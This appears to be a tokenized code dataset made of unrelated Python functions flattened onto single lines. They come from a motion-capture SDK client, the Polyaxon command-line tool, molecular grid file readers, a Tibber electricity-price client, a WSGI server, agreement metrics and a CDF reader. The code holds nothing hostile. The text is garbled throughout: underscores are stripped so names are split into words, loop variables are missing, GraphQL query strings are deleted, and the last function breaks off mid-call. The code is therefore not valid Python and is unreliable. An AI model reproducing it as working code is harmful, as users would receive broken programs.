def get analog ( self , component info = None , data = None , component position = None ) : components = [ ] append components = components . append for in range ( component info . device count ) : component position , device = QRT Packet . get exact ( RT Analog Device , data , component position ) if device . sample count > 0 : component position , sample number = QRT Packet . get exact ( RT Sample Number , data , component position ) RT Analog Channel . format = struct . Struct ( RT Analog Channel . format str % device . sample count ) for in range ( device . channel count ) : component position , channel = QRT Packet . get tuple ( RT Analog Channel , data , component position ) append components ( ( device , sample number , channel ) ) return components
def get analog single ( self , component info = None , data = None , component position = None ) : components = [ ] append components = components . append for in range ( component info . device count ) : component position , device = QRT Packet . get exact ( RT Analog Device Single , data , component position ) RT Analog Device Samples . format = struct . Struct ( RT Analog Device Samples . format str % device . channel count ) component position , sample = QRT Packet . get tuple ( RT Analog Device Samples , data , component position ) append components ( ( device , sample ) ) return components
def get force ( self , component info = None , data = None , component position = None ) : components = [ ] append components = components . append for in range ( component info . plate count ) : component position , plate = QRT Packet . get exact ( RT Force Plate , data , component position ) force list = [ ] for in range ( plate . force count ) : component position , force = QRT Packet . get exact ( RT Force , data , component position ) force list . append ( force ) append components ( ( plate , force list ) ) return components
def get force single ( self , component info = None , data = None , component position = None ) : components = [ ] append components = components . append for in range ( component info . plate count ) : component position , plate = QRT Packet . get exact ( RT Force Plate Single , data , component position ) component position , force = QRT Packet . get exact ( RT Force , data , component position ) append components ( ( plate , force ) ) return components
def get 6d ( self , component info = None , data = None , component position = None ) : components = [ ] append components = components . append for in range ( component info . body count ) : component position , position = QRT Packet . get exact ( RT6D Body Position , data , component position ) component position , matrix = QRT Packet . get tuple ( RT6D Body Rotation , data , component position ) append components ( ( position , matrix ) ) return components
def get 6d euler ( self , component info = None , data = None , component position = None ) : components = [ ] append components = components . append for in range ( component info . body count ) : component position , position = QRT Packet . get exact ( RT6D Body Position , data , component position ) component position , euler = QRT Packet . get exact ( RT6D Body Euler , data , component position ) append components ( ( position , euler ) ) return components
def get 3d markers ( self , component info = None , data = None , component position = None ) : return self . get 3d markers ( RT3D Marker Position , component info , data , component position )
def get 3d markers residual ( self , component info = None , data = None , component position = None ) : return self . get 3d markers ( RT3D Marker Position Residual , component info , data , component position )
def get 3d markers no label ( self , component info = None , data = None , component position = None ) : return self . get 3d markers ( RT3D Marker Position No Label , component info , data , component position )
def get 3d markers no label residual ( self , component info = None , data = None , component position = None ) : return self . get 3d markers ( RT3D Marker Position No Label Residual , component info , data , component position )
async def await event ( self , event = None , timeout = None ) : if self . event future is not None : raise Exception ( "Can't wait on multiple events!" ) result = await asyncio . wait for ( self . wait loop ( event ) , timeout ) return result
def send command ( self , command , callback = True , command type = QRT Packet Type . Packet Command ) : if self . transport is not None : cmd length = len ( command ) LOG . debug ( "S: %s" , command ) self . transport . write ( struct . pack ( RT Command % cmd length , R Theader . size + cmd length + 1 , command type . value , command . encode ( ) , b"\0" , ) ) future = self . loop . create future ( ) if callback : self . request queue . append ( future ) else : future . set result ( None ) return future raise QRT Command Exception ( "Not connected!" )
async def reboot ( ip address ) : , protocol = await asyncio . get event loop ( ) . create datagram endpoint ( Q Reboot Protocol , local addr = ( ip address , 0 ) , allow broadcast = True , reuse address = True , ) LOG . info ( "Sending reboot on %s" , ip address ) protocol . send reboot ( )
def on packet ( packet ) : print ( "Framenumber: {}" . format ( packet . framenumber ) ) header , markers = packet . get 3d markers ( ) print ( "Component info: {}" . format ( header ) ) for marker in markers : print ( "\t" , marker )
def datagram received ( self , datagram , address ) : size , = R Theader . unpack from ( datagram , 0 ) info , = struct . unpack from ( "{0}s" . format ( size - 3 - 8 ) , datagram , R Theader . size ) base port , = QRT Discovery Base Port . unpack from ( datagram , size - 2 ) if self . receiver is not None : self . receiver ( QRT Discovery Response ( info , address [ 0 ] , base port ) )
def send discovery packet ( self ) : if self . port is None : return self . transport . sendto ( QRT Discovery P1 . pack ( QRT Discovery Packet Size , QRT Packet Type . Packet Discover . value ) + QRT Discovery P2 . pack ( self . port ) , ( "<broadcast>" , 22226 ) , )
async def packet receiver ( queue ) : LOG . info ( "Entering packet receiver" ) while True : packet = await queue . get ( ) if packet is None : break LOG . info ( "Framenumber %s" , packet . framenumber ) LOG . info ( "Exiting packet receiver" )
async def choose qtm instance ( interface ) : instances = { } print ( "Available QTM instances:" ) async for i , qtm instance in Async Enumerate ( qtm . Discover ( interface ) , start = 1 ) : instances [ i ] = qtm instance print ( "{} - {}" . format ( i , qtm instance . info ) ) try : choice = int ( input ( "Connect to: " ) ) if choice not in instances : raise Value Error except Value Error : LOG . error ( "Invalid choice" ) return None return instances [ choice ] . host
async def package receiver ( queue ) : LOG . info ( "Entering package receiver" ) while True : packet = await queue . get ( ) if packet is None : break LOG . info ( "Framenumber %s" , packet . framenumber ) header , cameras = packet . get 2d markers ( ) LOG . info ( "Component info: %s" , header ) for i , camera in enumerate ( cameras , 1 ) : LOG . info ( "Camera %d" , i ) for marker in camera : LOG . info ( "\t%s" , marker ) LOG . info ( "Exiting package receiver" )
def create body index ( xml string ) : xml = ET . fromstring ( xml string ) body to index = { } for index , body in enumerate ( xml . findall ( "*/Body/Name" ) ) : body to index [ body . text . strip ( ) ] = index return body to index
def build swig ( ) : print ( "Looking for FANN libs..." ) find fann ( ) print ( "running SWIG..." ) swig bin = find swig ( ) swig cmd = [ swig bin , '-c++' , '-python' , 'fann2/fann2.i' ] subprocess . Popen ( swig cmd ) . wait ( )
def experiment ( ctx , project , experiment ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project ctx . obj [ 'experiment' ] = experiment
def upload ( sync = True ) : # pylint:disable=assign-to-new-keyword project = Project Manager . get config or raise ( ) files = Ignore Manager . get unignored file paths ( ) try : with create tarfile ( files , project . name ) as file path : with get files in current directory ( 'repo' , [ file path ] ) as ( files , files size ) : try : Polyaxon Client ( ) . project . upload repo ( project . user , project . name , files , files size , sync = sync ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Could not upload code for project `{}`.' . format ( project . name ) ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) Printer . print error ( 'Check the project exists, ' 'and that you have access rights, ' 'this could happen as well when uploading large files.' 'If you are running a notebook and mounting the code to the notebook, ' 'you should stop it before uploading.' ) sys . exit ( 1 ) Printer . print success ( 'Files uploaded.' ) except Exception as e : Printer . print error ( "Could not upload the file." ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 )
def cluster ( node ) : cluster client = Polyaxon Client ( ) . cluster if node : try : node config = cluster client . get node ( node ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Could not load node `{}` info.' . format ( node ) ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) get node info ( node config ) else : try : cluster config = cluster client . get cluster ( ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Could not load cluster info.' ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) get cluster info ( cluster config )
def check ( file , # pylint:disable=redefined-builtin version , definition ) : file = file or 'polyaxonfile.yaml' specification = check polyaxonfile ( file ) . specification if version : Printer . decorate format value ( 'The version is: {}' , specification . version , 'yellow' ) if definition : job condition = ( specification . is job or specification . is build or specification . is notebook or specification . is tensorboard ) if specification . is experiment : Printer . decorate format value ( 'This polyaxon specification has {}' , 'One experiment' , 'yellow' ) if job condition : Printer . decorate format value ( 'This {} polyaxon specification is valid' , specification . kind , 'yellow' ) if specification . is group : experiments def = specification . experiments def click . echo ( 'This polyaxon specification has experiment group with the following definition:' ) get group experiments info ( * * experiments def ) return specification
def job ( ctx , project , job ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project ctx . obj [ 'job' ] = job
def pprint ( value ) : click . echo ( json . dumps ( value , sort keys = True , indent = 4 , separators = ( ',' , ': ' ) ) )
def login ( token , username , password ) : auth client = Polyaxon Client ( ) . auth if username : # Use username / password login if not password : password = click . prompt ( 'Please enter your password' , type = str , hide input = True ) password = password . strip ( ) if not password : logger . info ( 'You entered an empty string. ' 'Please make sure you enter your password correctly.' ) sys . exit ( 1 ) credentials = Credentials Config ( username = username , password = password ) try : access code = auth client . login ( credentials = credentials ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Could not login.' ) Printer . print error ( 'Error Message `{}`.' . format ( e ) ) sys . exit ( 1 ) if not access code : Printer . print error ( "Failed to login" ) return else : if not token : token url = "{}/app/token" . format ( auth client . config . http host ) click . confirm ( 'Authentication token page will now open in your browser. Continue?' , abort = True , default = True ) click . launch ( token url ) logger . info ( "Please copy and paste the authentication token." ) token = click . prompt ( 'This is an invisible field. Paste token and press ENTER' , type = str , hide input = True ) if not token : logger . info ( "Empty token received. " "Make sure your shell is handling the token appropriately." ) logger . info ( "See docs for help: http://docs.polyaxon.com/polyaxon cli/commands/auth" ) return access code = token . strip ( " " ) # Set user try : Auth Config Manager . purge ( ) user = Polyaxon Client ( ) . auth . get user ( token = access code ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Could not load user info.' ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) access token = Access Token Config ( username = user . username , token = access code ) Auth Config Manager . set config ( access token ) Printer . print success ( "Login successful" ) # Reset current cli server version = get server version ( ) current version = get current version ( ) log handler = get log handler ( ) Cli Config Manager . reset ( check count = 0 , current version = current version , min version = server version . min version , log handler = log handler )
def whoami ( ) : try : user = Polyaxon Client ( ) . auth . get user ( ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Could not load user info.' ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) click . echo ( "\n Username: {username}, Email: {email}\n" . format ( * * user . to dict ( ) ) )
def build ( ctx , project , build ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project ctx . obj [ 'build' ] = build
def init ( project , polyaxonfile ) : user , project name = get project or local ( project ) try : project config = Polyaxon Client ( ) . project . get project ( user , project name ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Make sure you have a project with this name `{}`' . format ( project ) ) Printer . print error ( 'You can a create new project with this command: ' 'polyaxon project create ' '--name={} [--description=...] [--tags=...]' . format ( project name ) ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) init project = False if Project Manager . is initialized ( ) : local project = Project Manager . get config ( ) click . echo ( 'Warning! This project is already initialized with the following project:' ) with clint . textui . indent ( 4 ) : clint . textui . puts ( 'User: {}' . format ( local project . user ) ) clint . textui . puts ( 'Project: {}' . format ( local project . name ) ) if click . confirm ( 'Would you like to override this current config?' , default = False ) : init project = True else : init project = True if init project : Project Manager . purge ( ) Project Manager . set config ( project config , init = True ) Printer . print success ( 'Project was initialized' ) else : Printer . print header ( 'Project config was not changed.' ) init ignore = False if Ignore Manager . is initialized ( ) : click . echo ( 'Warning! Found a .polyaxonignore file.' ) if click . confirm ( 'Would you like to override it?' , default = False ) : init ignore = True else : init ignore = True if init ignore : Ignore Manager . init config ( ) Printer . print success ( 'New .polyaxonignore file was created.' ) else : Printer . print header ( '.polyaxonignore file was not changed.' ) if polyaxonfile : create polyaxonfile ( )
def bookmark ( ctx , username ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'username' ] = username
def remove trailing spaces ( line ) : while line . endswith ( ' ' ) and not line . endswith ( '\\ ' ) : line = line [ : - 1 ] return line . replace ( '\\ ' , ' ' )
def find matching ( cls , path , patterns ) : for pattern in patterns : if pattern . match ( path ) : yield pattern
def is ignored ( cls , path , patterns ) : status = None for pattern in cls . find matching ( path , patterns ) : status = pattern . is exclude return status
def matches patterns ( path , patterns ) : for glob in patterns : try : if Pure Path ( path ) . match ( glob ) : return True except Type Error : pass return False
def ignore path ( cls , path , ignore list = None , white list = None ) : ignore list = ignore list or [ ] white list = white list or [ ] return ( cls . matches patterns ( path , ignore list ) and not cls . matches patterns ( path , white list ) )
def group ( ctx , project , group ) : # pylint:disable=redefined-outer-name ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project ctx . obj [ 'group' ] = group
def config ( list ) : # pylint:disable=redefined-builtin if list : config = Global Config Manager . get config or default ( ) Printer . print header ( 'Current config:' ) dict tabulate ( config . to dict ( ) )
def teardown ( file ) : # pylint:disable=redefined-builtin config = read deployment config ( file ) manager = Deploy Manager ( config = config , filepath = file ) exception = None try : if click . confirm ( 'Would you like to execute pre-delete hooks?' , default = True ) : manager . teardown ( hooks = True ) else : manager . teardown ( hooks = False ) except Exception as e : Printer . print error ( 'Polyaxon could not teardown the deployment.' ) exception = e if exception : Printer . print error ( 'Error message `{}`.' . format ( exception ) )
def create tarfile ( files , project name ) : fd , filename = tempfile . mkstemp ( prefix = "polyaxon {}" . format ( project name ) , suffix = '.tar.gz' ) with tarfile . open ( filename , "w:gz" ) as tar : for f in files : tar . add ( f ) yield filename # clear os . close ( fd ) os . remove ( filename )
def check cli version ( ) : if not Cli Config Manager . should check ( ) : return server version = get server version ( ) current version = get current version ( ) Cli Config Manager . reset ( current version = current version , min version = server version . min version ) if Loose Version ( current version ) < Loose Version ( server version . min version ) : click . echo ( """Your version of CLI ({}) is no longer compatible with server.""" . format ( current version ) ) if click . confirm ( "Do you want to upgrade to " "version {} now?" . format ( server version . latest version ) ) : pip upgrade ( ) sys . exit ( 0 ) else : clint . textui . puts ( "Your can manually run:" ) with clint . textui . indent ( 4 ) : clint . textui . puts ( "pip install -U polyaxon-cli" ) clint . textui . puts ( "to upgrade to the latest version `{}`" . format ( server version . latest version ) ) sys . exit ( 0 ) elif Loose Version ( current version ) < Loose Version ( server version . latest version ) : clint . textui . puts ( "New version of CLI ({}) is now available. To upgrade run:" . format ( server version . latest version ) ) with clint . textui . indent ( 4 ) : clint . textui . puts ( "pip install -U polyaxon-cli" ) elif Loose Version ( current version ) > Loose Version ( server version . latest version ) : clint . textui . puts ( "You version of CLI ({}) is ahead of the latest version " "supported by Polyaxon Platform ({}) on your cluster, " "and might be incompatible." . format ( current version , server version . latest version ) )
def version ( cli , platform ) : version client = Polyaxon Client ( ) . version cli = cli or not any ( [ cli , platform ] ) if cli : try : server version = version client . get cli version ( ) except Authorization Error : session expired ( ) sys . exit ( 1 ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Could not get cli version.' ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) cli version = get version ( PROJECT CLI NAME ) Printer . print header ( 'Current cli version: {}.' . format ( cli version ) ) Printer . print header ( 'Supported cli versions:' ) dict tabulate ( server version . to dict ( ) ) if platform : try : platform version = version client . get platform version ( ) except Authorization Error : session expired ( ) sys . exit ( 1 ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Could not get platform version.' ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) chart version = version client . get chart version ( ) Printer . print header ( 'Current platform version: {}.' . format ( chart version . version ) ) Printer . print header ( 'Supported platform versions:' ) dict tabulate ( platform version . to dict ( ) )
def dashboard ( yes , url ) : dashboard url = "{}/app" . format ( Polyaxon Client ( ) . api config . http host ) if url : click . echo ( dashboard url ) sys . exit ( 0 ) if not yes : click . confirm ( 'Dashboard page will now open in your browser. Continue?' , abort = True , default = True ) click . launch ( dashboard url )
def check ( self ) : if not self . is valid : raise Polyaxon Deployment Config Error ( 'Deployment type `{}` not supported' . format ( self . deployment type ) ) check = False if self . is kubernetes : check = self . check for kubernetes ( ) elif self . is docker compose : check = self . check for docker compose ( ) elif self . is docker : check = self . check for docker ( ) elif self . is heroku : check = self . check for heroku ( ) if not check : raise Polyaxon Deployment Config Error ( 'Deployment `{}` is not valid' . format ( self . deployment type ) )
def install ( self ) : if not self . is valid : raise Polyaxon Deployment Config Error ( 'Deployment type `{}` not supported' . format ( self . deployment type ) ) if self . is kubernetes : self . install on kubernetes ( ) elif self . is docker compose : self . install on docker compose ( ) elif self . is docker : self . install on docker ( ) elif self . is heroku : self . install on heroku ( )
def project ( ctx , project ) : # pylint:disable=redefined-outer-name if ctx . invoked subcommand not in [ 'create' , 'list' ] : ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project
def download ( ctx ) : user , project name = get project or local ( ctx . obj . get ( 'project' ) ) try : Polyaxon Client ( ) . project . download repo ( user , project name ) except ( Polyaxon HTTP Error , Polyaxon Should Exit Error , Polyaxon Client Exception ) as e : Printer . print error ( 'Could not download code for project `{}`.' . format ( project name ) ) Printer . print error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) Printer . print success ( 'Files downloaded.' )
def write ( self , file , optstring = "" , quote = False ) : classid = str ( self . id ) if quote : classid = '"' + classid + '"' # Only use a *single* space between tokens; both chimera's and pymol's DX parser # does not properly implement the Open DX specs and produces garbage with multiple # spaces. (Chimera 1.4.1, Py MOL 1.3) file . write ( 'object ' + classid + ' class ' + str ( self . name ) + ' ' + optstring + '\n' )
def value ( self , ascode = None ) : if ascode is None : ascode = self . code return self . cast [ ascode ] ( self . text )
def use parser ( self , parsername ) : self . parser = self . parsers [ parsername ] self . parser ( )
def read ( self , filename ) : from struct import calcsize , unpack if not filename is None : self . filename = filename with open ( self . filename , 'rb' ) as plt : h = self . header = self . read header ( plt ) nentries = h [ 'nx' ] * h [ 'ny' ] * h [ 'nz' ] # quick and dirty... slurp it all in one go datafmt = h [ 'bsaflag' ] + str ( nentries ) + self . data bintype a = numpy . array ( unpack ( datafmt , plt . read ( calcsize ( datafmt ) ) ) ) self . header [ 'filename' ] = self . filename self . array = a . reshape ( h [ 'nz' ] , h [ 'ny' ] , h [ 'nx' ] ) . transpose ( ) # unpack plt in reverse!! self . delta = self . delta ( ) self . origin = numpy . array ( [ h [ 'xmin' ] , h [ 'ymin' ] , h [ 'zmin' ] ] ) + 0.5 * numpy . diagonal ( self . delta ) self . rank = h [ 'rank' ]
def load cpp4 ( self , filename ) : ccp4 = CCP4 . CCP4 ( ) ccp4 . read ( filename ) grid , edges = ccp4 . histogramdd ( ) self . init ( grid = grid , edges = edges , metadata = self . metadata )
def load dx ( self , filename ) : dx = Open DX . field ( 0 ) dx . read ( filename ) grid , edges = dx . histogramdd ( ) self . init ( grid = grid , edges = edges , metadata = self . metadata )
def load plt ( self , filename ) : g = g Open Mol . Plt ( ) g . read ( filename ) grid , edges = g . histogramdd ( ) self . init ( grid = grid , edges = edges , metadata = self . metadata )
def read ( self , filename ) : if filename is not None : self . filename = filename with open ( self . filename , 'rb' ) as ccp4 : h = self . header = self . read header ( ccp4 ) nentries = h [ 'nc' ] * h [ 'nr' ] * h [ 'ns' ] # Quick and dirty... slurp it all in one go. datafmt = h [ 'bsaflag' ] + str ( nentries ) + self . data bintype a = np . array ( struct . unpack ( datafmt , ccp4 . read ( struct . calcsize ( datafmt ) ) ) ) self . header [ 'filename' ] = self . filename # TODO: Account for the possibility that y-axis is fastest or # slowest index, which unfortunately is possible in CCP4. order = 'C' if h [ 'mapc' ] == 'z' else 'F' self . array = a . reshape ( h [ 'nc' ] , h [ 'nr' ] , h [ 'ns' ] , order = order ) self . delta = self . delta ( ) self . origin = np . zeros ( 3 ) self . rank = 3
async def rt connect ( self , loop ) : if self . sub manager is not None : return self . sub manager = Subscription Manager ( loop , "token={}" . format ( self . access token ) , SUB ENDPOINT ) self . sub manager . start ( )
def sync update info ( self , * ) : loop = asyncio . get event loop ( ) task = loop . create task ( self . update info ( ) ) loop . run until complete ( task )
async def update info ( self , * ) : query = gql ( ) res = await self . execute ( query ) if res is None : return errors = res . get ( "errors" , [ ] ) if errors : msg = errors [ 0 ] . get ( "message" , "failed to login" ) LOGGER . error ( msg ) raise Invalid Login ( msg ) data = res . get ( "data" ) if not data : return viewer = data . get ( "viewer" ) if not viewer : return self . name = viewer . get ( "name" ) homes = viewer . get ( "homes" , [ ] ) self . home ids = [ ] for home in homes : home id = home . get ( "id" ) self . all home ids += [ home id ] subs = home . get ( "subscriptions" ) if subs : status = subs [ 0 ] . get ( "status" , "ended" ) . lower ( ) if not home id or status != "running" : continue self . home ids += [ home id ]
def get homes ( self , only active = True ) : return [ self . get home ( home id ) for home id in self . get home ids ( only active ) ]
def get home ( self , home id ) : if home id not in self . all home ids : LOGGER . error ( "Could not find any Tibber home with id: %s" , home id ) return None if home id not in self . homes . keys ( ) : self . homes [ home id ] = Tibber Home ( home id , self ) return self . homes [ home id ]
async def update info ( self ) : query = gql ( % self . home id ) self . info = await self . tibber control . execute ( query )
def sync update current price info ( self ) : loop = asyncio . get event loop ( ) task = loop . create task ( self . update current price info ( ) ) loop . run until complete ( task )
async def update current price info ( self ) : query = gql ( % self . home id ) price info temp = await self . tibber control . execute ( query ) if not price info temp : LOGGER . error ( "Could not find current price info." ) return try : home = price info temp [ "viewer" ] [ "home" ] current subscription = home [ "current Subscription" ] price info = current subscription [ "price Info" ] [ "current" ] except ( Key Error , Type Error ) : LOGGER . error ( "Could not find current price info." ) return if price info : self . current price info = price info
def sync update price info ( self ) : loop = asyncio . get event loop ( ) task = loop . create task ( self . update price info ( ) ) loop . run until complete ( task )
async def update price info ( self ) : query = gql ( % self . home id ) price info temp = await self . tibber control . execute ( query ) if not price info temp : LOGGER . error ( "Could not find price info." ) return self . price info = { } self . level info = { } for key in [ "current" , "today" , "tomorrow" ] : try : home = price info temp [ "viewer" ] [ "home" ] current subscription = home [ "current Subscription" ] price info = current subscription [ "price Info" ] [ key ] except ( Key Error , Type Error ) : LOGGER . error ( "Could not find price info for %s." , key ) continue if key == "current" : self . current price info = price info continue for data in price info : self . price info [ data . get ( "starts At" ) ] = data . get ( "total" ) self . level info [ data . get ( "starts At" ) ] = data . get ( "level" )
def currency ( self ) : try : current subscription = self . info [ "viewer" ] [ "home" ] [ "current Subscription" ] return current subscription [ "price Info" ] [ "current" ] [ "currency" ] except ( Key Error , Type Error , Index Error ) : LOGGER . error ( "Could not find currency." ) return ""
def price unit ( self ) : currency = self . currency consumption unit = self . consumption unit if not currency or not consumption unit : LOGGER . error ( "Could not find price unit." ) return " " return currency + "/" + consumption unit
async def rt subscribe ( self , loop , async callback ) : if self . subscription id is not None : LOGGER . error ( "Already subscribed." ) return await self . tibber control . rt connect ( loop ) document = gql ( % self . home id ) sub query = print ast ( document ) self . subscription id = await self . tibber control . sub manager . subscribe ( sub query , async callback )
async def rt unsubscribe ( self ) : if self . subscription id is None : LOGGER . error ( "Not subscribed." ) return await self . tibber control . sub manager . unsubscribe ( self . subscription id )
def rt subscription running ( self ) : return ( self . tibber control . sub manager is not None and self . tibber control . sub manager . is running and self . subscription id is not None )
async def get historic data ( self , n data ) : query = gql ( % ( self . home id , n data ) ) data = await self . tibber control . execute ( query ) if not data : LOGGER . error ( "Could not find current the data." ) return data = data [ "viewer" ] [ "home" ] [ "consumption" ] if data is None : self . data = [ ] return self . data = data [ "nodes" ]
def cleanup none ( self ) : for ( prop , default ) in self . defaults . items ( ) : if getattr ( self , prop ) == ' None' : setattr ( self , prop , None )
def build environ ( self , sock file , conn ) : # Grab the request line request = self . read request line ( sock file ) # Copy the Base Environment environ = self . base environ . copy ( ) # Grab the headers for k , v in self . read headers ( sock file ) . items ( ) : environ [ str ( 'HTTP ' + k ) ] = v # Add CGI Variables environ [ 'REQUEST METHOD' ] = request [ 'method' ] environ [ 'PATH INFO' ] = request [ 'path' ] environ [ 'SERVER PROTOCOL' ] = request [ 'protocol' ] environ [ 'SERVER PORT' ] = str ( conn . server port ) environ [ 'REMOTE PORT' ] = str ( conn . client port ) environ [ 'REMOTE ADDR' ] = str ( conn . client addr ) environ [ 'QUERY STRING' ] = request [ 'query string' ] if 'HTTP CONTENT LENGTH' in environ : environ [ 'CONTENT LENGTH' ] = environ [ 'HTTP CONTENT LENGTH' ] if 'HTTP CONTENT TYPE' in environ : environ [ 'CONTENT TYPE' ] = environ [ 'HTTP CONTENT TYPE' ] # Save the request method for later self . request method = environ [ 'REQUEST METHOD' ] # Add Dynamic WSGI Variables if conn . ssl : environ [ 'wsgi.url scheme' ] = 'https' environ [ 'HTTPS' ] = 'on' else : environ [ 'wsgi.url scheme' ] = 'http' if environ . get ( 'HTTP TRANSFER ENCODING' , '' ) == 'chunked' : environ [ 'wsgi.input' ] = Chunked Reader ( sock file ) else : environ [ 'wsgi.input' ] = sock file return environ
def write ( self , data , sections = None ) : if self . error [ 0 ] : self . status = self . error [ 0 ] data = b ( self . error [ 1 ] ) if not self . headers sent : self . send headers ( data , sections ) if self . request method != 'HEAD' : try : if self . chunked : self . conn . sendall ( b ( '%x\r\n%s\r\n' % ( len ( data ) , data ) ) ) else : self . conn . sendall ( data ) except socket . timeout : self . close Connection = True except socket . error : # But some clients will close the connection before that # resulting in a socket error. self . close Connection = True
def Cherry Py WSGI Server ( bind addr , wsgi app , numthreads = 10 , server name = None , max = - 1 , request queue size = 5 , timeout = 10 , shutdown timeout = 5 ) : max threads = max if max threads < 0 : max threads = 0 return Rocket ( bind addr , 'wsgi' , { 'wsgi app' : wsgi app } , min threads = numthreads , max threads = max threads , queue size = request queue size , timeout = timeout )
def ordinal metric ( v1 , v2 , i1 , i2 , n v ) : if i1 > i2 : i1 , i2 = i2 , i1 return ( np . sum ( n v [ i1 : ( i2 + 1 ) ] ) - ( n v [ i1 ] + n v [ i2 ] ) / 2 ) ** 2
def ratio metric ( v1 , v2 , * * kwargs ) : return ( ( ( v1 - v2 ) / ( v1 + v2 ) ) ** 2 ) if v1 + v2 != 0 else 0
def process return multi z ( self , data , names , dim sizes ) : # process data d1 = 0 d2 = 0 for name , dim size in zip ( names , dim sizes ) : d2 = d1 + dim size if dim size == 1 : self . data [ name . rstrip ( ) ] = data [ d1 , : ] else : self . data [ name . rstrip ( ) ] = data [ d1 : d2 , : ] d1 += dim size
def read all attribute info ( self ) : num = copy . deepcopy ( self . num attrs ) fname = copy . deepcopy ( self . fname ) out = fortran cdf . inquire all attr ( fname , num , len ( fname ) ) status = out [ 0 ] names = out [ 1 ] . astype ( 'U' ) scopes = out [ 2 ] max gentries = out [ 3 ] max rentries = out [ 4 ] max zentries = out [ 5 ] attr nums = out [ 6 ] global attrs info = { } var attrs info = { } if status == 0 : for name , scope , gentry , rentry , zentry , num in zip ( names , scopes , max gentries , max rentries , max zentries , attr nums ) : name = '' . join ( name ) name = name . rstrip ( ) nug = { } nug [ 'scope' ] = scope nug [ 'max gentry' ] = gentry nug [ 'max rentry' ] = rentry nug [ 'max zentry' ] = zentry nug [ 'attr num' ] = num flag = ( gentry == 0 ) & ( rentry == 0 ) & ( zentry == 0 ) if not flag : if scope == 1 : global attrs info [ name ] = nug elif scope == 2 : var attrs info [ name ] = nug self . global attrs info = global attrs info self . var attrs info = var attrs info else : raise IO Error ( fortran cdf . statusreporter ( status ) )
def read all z attribute data ( self ) : self . meta = { } # collect attribute info needed to get more info from  # fortran routines max entries = [ ] attr nums = [ ] names = [ ] attr names = [ ] names = self . var attrs info . keys ( ) num z attrs = len ( names ) exp attr nums = [ ] for key in names : max entries . append ( self . var attrs info [ key ] [ 'max zentry' ] ) attr nums . append ( self . var attrs info [ key ] [ 'attr num' ] ) attr nums = np . array ( attr nums ) max entries = np . array ( max entries ) info = fortran cdf . z attr all inquire ( self . fname , attr nums , num z attrs , max entries , self . num z vars , len ( self . fname ) ) status = info [ 0 ] data types = info [ 1 ] num elems = info [ 2 ] entry nums = info [ 3 ] if status == 0 : for i , name in enumerate ( names ) : self . var attrs info [ name ] [ 'data type' ] = data types [ i ] self . var attrs info [ name ] [ 'num elems' ] = num elems [ i ] self . var attrs info [ name ] [ 'entry num' ] = entry nums [ i ] exp attr nums . extend ( [ self . var attrs info [ name ] [ 'attr num' ] ] * len ( entry nums [ i ] ) ) attr names . extend ( [ name ] * len ( entry nums [ i ] ) ) else : raise IO Error ( fortran cdf . statusreporter ( status ) ) # all the info is now packed up # need to break it out to make it easier to load via fortran # all of this junk # attribute  id, entry id (z Variable ID), data type, num elems # should just need to flatten this stuff data types = data types . flatten ( ) num elems = num elems . flatten ( ) entry nums = entry nums . flatten ( ) attr nums = np . array ( exp attr nums ) # drop everything that isn't valid idx , = np . where ( entry nums > 0 ) data types = data types [ idx ] num elems = num elems [ idx ] entry nums = entry nums [ idx ] attr nums = attr nums [ idx ] attr names = np . array ( attr names ) [ idx ] # grad corresponding variable name for each attribute var names = [ self . z variable names by num [ i ] . rstrip ( ) for i in entry nums ] # the names that go along with this are already set up # in attr names # chunk by data type, grab largest num elems # get data back, shorten to num elems, add to structure self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'real4' ] , fortran cdf . get multi z attr real4 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'float' ] , fortran cdf . get multi z attr real4 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'real8' ] , fortran cdf . get multi z attr real8 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'double' ] , fortran cdf . get multi z attr real8 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'byte' ] , fortran cdf . get multi z attr int1 ) self . call multi fortran z attr ( attr names , data types , num elems , entry nums , attr nums , var names , self . cdf data types [ 'int1' ] , fortran cdf . get multi z attr int1 